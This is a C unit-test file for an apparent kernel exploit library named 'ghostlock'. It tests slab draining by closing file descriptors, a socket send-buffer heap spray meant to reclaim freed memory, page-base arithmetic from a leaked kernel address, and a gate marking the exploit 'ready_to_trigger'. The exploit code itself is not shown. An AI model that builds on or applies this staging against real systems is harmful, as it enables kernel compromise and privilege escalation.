#include "reclaim_hold.h"

#include <assert.h>
#include <errno.h>
#include <fcntl.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

static void test_marker_drain(void) {
  enum { FD_COUNT = 10, OBJECTS_PER_SLAB = 3 };
  int fds[FD_COUNT];
  for (size_t i = 0; i < FD_COUNT; i++) {
    fds[i] = open("/dev/null", O_RDONLY);
    assert(fds[i] >= 0);
  }

  struct ghostlock_marker_result result;
  assert(ghostlock_close_slab_markers(fds, FD_COUNT, OBJECTS_PER_SLAB,
                                      &result));
  assert(result.complete);
  assert(result.requested == 4);
  assert(result.closed == 4);

  for (size_t i = 0; i < FD_COUNT; i++) {
    if (i % OBJECTS_PER_SLAB == 0) {
      assert(fds[i] == -1);
    } else {
      assert(fds[i] >= 0);
      assert(close(fds[i]) == 0);
    }
  }
}

static void test_hold_all(void) {
  struct ghostlock_reclaim_batch batch;
  ghostlock_reclaim_batch_init(&batch);
  assert(ghostlock_reclaim_batch_open(&batch, GHOSTLOCK_RECLAIM_PAIRS,
                                      GHOSTLOCK_RECLAIM_SNDBUF) == 0);

  const size_t payload_len = 0x8e80;
  unsigned char *payload = malloc(payload_len);
  assert(payload);
  memset(payload, 0xa5, payload_len);

  struct ghostlock_reclaim_result result;
  assert(ghostlock_reclaim_hold_all(&batch, payload, payload_len,
                                    GHOSTLOCK_RECLAIM_SENDS, &result));
  assert(result.complete);
  assert(result.sent == GHOSTLOCK_RECLAIM_SENDS);
  assert(batch.held_sends == GHOSTLOCK_RECLAIM_SENDS);
  for (size_t pair = 0; pair < GHOSTLOCK_RECLAIM_PAIRS; pair++) {
    assert(result.sent_per_pair[pair] == 4);
  }

  ghostlock_reclaim_batch_close(&batch);
  assert(!batch.initialized);
  assert(batch.pair_count == 0);
  assert(batch.held_sends == 0);
  for (size_t pair = 0; pair < GHOSTLOCK_RECLAIM_PAIRS; pair++) {
    assert(batch.sv[pair][0] == -1);
    assert(batch.sv[pair][1] == -1);
  }
  free(payload);
}

static void test_incremental_hold(void) {
  enum { SEND_COUNT = 35 };
  struct ghostlock_reclaim_batch batch;
  ghostlock_reclaim_batch_init(&batch);
  assert(ghostlock_reclaim_batch_open(&batch, GHOSTLOCK_RECLAIM_PAIRS,
                                      GHOSTLOCK_RECLAIM_SNDBUF) == 0);

  const size_t payload_len = 0x8e80;
  unsigned char *payload = malloc(payload_len);
  assert(payload);
  memset(payload, 0x5a, payload_len);

  for (size_t send = 0; send < SEND_COUNT; send++) {
    assert(ghostlock_reclaim_hold_one(&batch, payload, payload_len));
    assert(batch.held_sends == send + 1);
  }

  ghostlock_reclaim_batch_close(&batch);
  free(payload);
}

static void test_max_pair_capacity(void) {
  struct ghostlock_reclaim_batch batch;
  ghostlock_reclaim_batch_init(&batch);
  assert(ghostlock_reclaim_batch_open(&batch, GHOSTLOCK_RECLAIM_MAX_PAIRS,
                                      GHOSTLOCK_RECLAIM_SNDBUF) == 0);
  assert(batch.pair_count == GHOSTLOCK_RECLAIM_MAX_PAIRS);
  ghostlock_reclaim_batch_close(&batch);
  for (size_t pair = 0; pair < GHOSTLOCK_RECLAIM_MAX_PAIRS; pair++) {
    assert(batch.sv[pair][0] == -1);
    assert(batch.sv[pair][1] == -1);
  }
}

static void test_prepare_gate(void) {
  struct ghostlock_prepare_result prepare;
  ghostlock_prepare_result_init(&prepare, 1);
  assert(ghostlock_prepare_note_leak(&prepare, 0xffffffe6a2a5a680ULL,
                                     0x8000, 0x380));
  assert(prepare.page_base == 0xffffffe6a2a58000ULL);
  assert(prepare.leaked_offset == 0x2680);
  assert(prepare.objects_per_slab == 36);

  struct ghostlock_marker_result markers = {
      .requested = 8,
      .closed = 8,
      .first_failed_index = SIZE_MAX,
      .complete = 1,
  };
  assert(ghostlock_prepare_note_page_release(&prepare, &markers));

  struct ghostlock_reclaim_result reclaim = {
      .requested = GHOSTLOCK_RECLAIM_SENDS,
      .sent = GHOSTLOCK_RECLAIM_SENDS,
      .failed_pair = -1,
      .complete = 1,
  };
  assert(ghostlock_prepare_note_spray(&prepare, &reclaim));
  assert(!prepare.capture_verified);
  assert(!prepare.ready_to_trigger);

  assert(ghostlock_prepare_note_trace(&prepare, GHOSTLOCK_TRACE_REQUIRED));
  assert(prepare.capture_verified);
  assert(!prepare.ready_to_trigger);

  ghostlock_prepare_result_init(&prepare, 0);
  assert(ghostlock_prepare_note_leak(&prepare, 0xffffffe6a2a5a680ULL,
                                     0x8000, 0x380));
  assert(ghostlock_prepare_note_page_release(&prepare, &markers));
  assert(ghostlock_prepare_note_spray(&prepare, &reclaim));
  assert(ghostlock_prepare_note_trace(&prepare, GHOSTLOCK_TRACE_REQUIRED));
  assert(prepare.capture_verified);
  assert(prepare.ready_to_trigger);
}

int main(void) {
  test_marker_drain();
  test_hold_all();
  test_incremental_hold();
  test_max_pair_capacity();
  test_prepare_gate();
  return 0;
}
